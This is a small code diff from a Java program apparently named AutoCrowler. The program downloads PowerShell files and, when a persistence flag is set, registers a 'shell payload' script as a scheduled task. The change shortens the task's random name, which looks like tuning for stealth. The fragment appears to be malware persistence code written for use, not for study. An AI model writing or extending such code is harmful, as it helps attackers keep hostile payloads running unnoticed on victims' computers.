@@ -19,7 +19,7 @@ public class AutoCrowler {
 			DownloadAndCreatepowershellFiles();
 			if (!shellpayloadScriptPatch.equals("") && PERSIST) {
 				// U can change the job name 
-				BasicShedulePowerShellCreate.CreateScheduleByFile(shellpayloadScriptPatch, UUID.randomUUID().toString());
+				BasicShedulePowerShellCreate.CreateScheduleByFile(shellpayloadScriptPatch, UUID.randomUUID().toString().split("-") [0]);
 			}
 		} catch (IOException e) {
 		}
